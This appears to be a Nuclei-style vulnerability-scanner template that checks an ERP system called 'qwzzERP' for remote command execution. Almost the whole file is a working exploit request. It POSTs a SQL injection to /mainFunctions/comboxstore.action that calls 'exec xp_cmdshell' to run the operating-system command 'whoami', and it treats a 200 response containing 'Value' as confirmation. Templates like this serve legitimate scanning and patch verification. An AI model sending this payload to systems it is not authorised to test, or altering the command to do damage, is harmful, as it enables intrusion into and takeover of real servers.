id: qwzzERP-comboxstore-rce

info:
  name: qwzzERP-comboxstore-rce
  author: qwzzERP-comboxstore-rce

http:
  - raw:
      - |
        POST /mainFunctions/comboxstore.action HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Host: {{Hostname}}
        
        comboxsql=exec%20xp_cmdshell%20'whoami'
        


    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body,"Value")'